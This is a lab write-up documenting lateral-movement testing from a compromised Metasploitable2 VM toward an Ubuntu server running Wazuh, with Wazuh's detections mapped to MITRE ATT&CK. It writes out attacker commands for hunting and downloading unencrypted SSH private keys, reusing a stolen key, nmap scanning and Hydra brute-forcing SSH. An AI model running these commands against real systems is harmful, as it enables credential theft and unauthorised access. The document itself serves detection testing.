# Lateral Movement: Metasploitable → Ubuntu Server

This document covers lateral movement testing performed from the compromised Metasploitable2 target (192.168.94.131) against the defender host, Ubuntu-Server-01 (192.168.94.129). Three separate techniques were attempted, each demonstrating a different realistic attacker approach.

## Context

With root access already established on Metasploitable (see `docs/metasploitable-attack-chain.md`), the next logical step for an attacker is to use that foothold to reach further into the network — pivoting from a weak, already-compromised machine toward more valuable infrastructure. Here, Ubuntu Server hosts the Wazuh SIEM stack itself, making it a realistic next target.

---

## Attempt 1: Credential Reuse via Discovered SSH Key

**Technique:** Search the compromised host for stored credentials, then attempt to reuse them elsewhere on the network.

### Recon

From a root Meterpreter shell on Metasploitable:
```
find / -name "known_hosts" 2>/dev/null
→ /root/.ssh/known_hosts

find / -name "*.ssh" -o -name "id_rsa*" 2>/dev/null
→ /home/msfadmin/.ssh/id_rsa
→ /home/msfadmin/.ssh/id_rsa.pub
```

Two findings worth noting:
- `/root/.ssh/known_hosts` confirms root has SSH'd to *something* before, but the entry is stored in **hashed** form (OpenSSH's `HashKnownHosts` behavior) — the target hostname/IP can't be read back out directly, so this lead was a dead end without further work.
- `/home/msfadmin/.ssh/id_rsa` is a private key that printed to screen with **no passphrase prompt** — an unencrypted key, usable by anyone who obtains the file. This is a classic "found credentials" scenario attackers actively search for.

### Testing the key

The key file was transferred to Kali using Meterpreter's `download` command (not copy/paste — see the persistence lesson in `docs/metasploitable-attack-chain.md` about why manual key transfer is unreliable):
```
download /home/msfadmin/.ssh/id_rsa /tmp/found_key
```

Then tested against Ubuntu Server:
```bash
chmod 700 /tmp/found_key
chmod 600 /tmp/found_key/id_rsa
ssh -i /tmp/found_key/id_rsa msfadmin@192.168.94.129
```

### Result: Failed

SSH fell back to a password prompt rather than accepting the key. **msfadmin's Metasploitable key does not grant access to Ubuntu Server** — the two hosts do not share SSH trust via this credential.

**Takeaway:** This is a legitimate negative result, not a wasted attempt. It confirms Ubuntu Server is not vulnerable to this specific credential-reuse vector, which is a meaningful thing to verify and document rather than assume.

---

## Attempt 2: Internal Reconnaissance Scan

**Technique:** Scan the target network from the compromised host's perspective, rather than from the obvious external attacker machine (Kali) — testing whether new attack surface is visible from "inside."

### Execution

From a root shell on Metasploitable:
```
nmap -sV 192.168.94.129
```

### Result

```
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          (protocol 2.0)
443/tcp  closed https
1514/tcp open   fujitsu-dtcns?   (actually Wazuh agent communication)
1515/tcp open   tcpwrapped       (actually Wazuh agent enrollment)
8000/tcp open   http-alt?
8443/tcp open   ssl/unknown      (actually Wazuh dashboard)
```

Nothing unexpected or newly exploitable was found — the visible surface is exactly what was already known: SSH plus the Wazuh stack's own ports. No forgotten or misconfigured service was hiding from the "outside" view.

**Takeaway:** Ubuntu Server's exposed surface is consistent and minimal regardless of scanning origin. A clean result here is a defensive win, even though it didn't open a new attack path.

---

## Attempt 3: SSH Brute-Force (Pivoted Attack)

**Technique:** Brute-force SSH credentials against the target, using knowledge gained from the compromised host to justify targeting it — simulating an attacker who pivots through a weak machine to identify and then attack a stronger one.

**Note:** Metasploitable does not have Hydra installed (it's built as a victim machine, not an attacker platform), so this step was executed from Kali, aimed at Ubuntu Server — representing the attacker returning to their own tooling to act on what they learned from the compromised host.

### Execution

```bash
hydra -l cesar -P /usr/share/wordlists/rockyou.txt ssh://192.168.94.129
```

### Result

```
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
```

Hydra was unable to complete its run — connections began failing partway through. Initial hypothesis was that Wazuh's Active Response had auto-blocked Kali's IP (as it had in an earlier brute-force test against this same host). This was checked directly:

```bash
sudo iptables -L -n | grep 192.168.94.130
```

Result: **empty — no block rule found.** Active Response did not fire this time. The more likely cause is OpenSSH's own built-in connection rate-limiting (`MaxStartups`), which caps the number of simultaneous unauthenticated connection attempts and silently refuses new ones past that limit — a standard hardening default, not something specific to this lab's configuration.

### Wazuh Detection

Despite the password never being cracked, Wazuh logged and correctly categorized the entire attempt:

| Technique | Tactic | Description | Rule ID |
|---|---|---|---|
| T1110 | Credential Access | Maximum authentication attempts exceeded | 5758 |
| T1110 | Credential Access | User missed the password more than one time | 2502 |
| **T1110.001 / T1021.004** | **Credential Access, Lateral Movement** | sshd: authentication failed | **5760** |
| — | — | Suricata: SSH invalid banner | 86601 |

The **T1021.004 (Remote Services: SSH)** tagging under the **Lateral Movement** tactic is the key result here — Wazuh's own MITRE ATT&CK mapping correctly identified this activity as a lateral movement technique, not just a generic brute-force, without any manual tagging.

**Takeaway:** Even without a successful compromise, the attempt itself was fully visible and correctly classified by the SIEM — a strong demonstration of detection working as intended.

---

## Summary — MITRE ATT&CK Mapping

| Attempt | Technique ID | Technique Name | Tactic | Result |
|---|---|---|---|---|
| SSH key reuse | T1078 | Valid Accounts (attempted) | Lateral Movement | Failed — key not valid on target |
| Internal recon scan | T1046 | Network Service Discovery | Discovery | No new attack surface found |
| SSH brute-force (pivoted) | T1110.001, T1021.004 | Password Guessing; Remote Services: SSH | Credential Access, Lateral Movement | Detected and correctly tagged by Wazuh; stopped by SSH rate-limiting |

## Conclusion

Three distinct lateral movement techniques were tested against Ubuntu Server from the Metasploitable foothold. None succeeded in gaining access — Ubuntu Server's SSH key isolation, minimal exposed surface, and OpenSSH's own rate-limiting all held up. Just as importantly, the one attempt that produced meaningful activity (the brute-force) was fully captured and correctly classified by Wazuh as a lateral movement technique, confirming the SIEM's MITRE ATT&CK mapping works end-to-end even for attacks originating from an already-compromised internal host rather than an obvious external attacker.
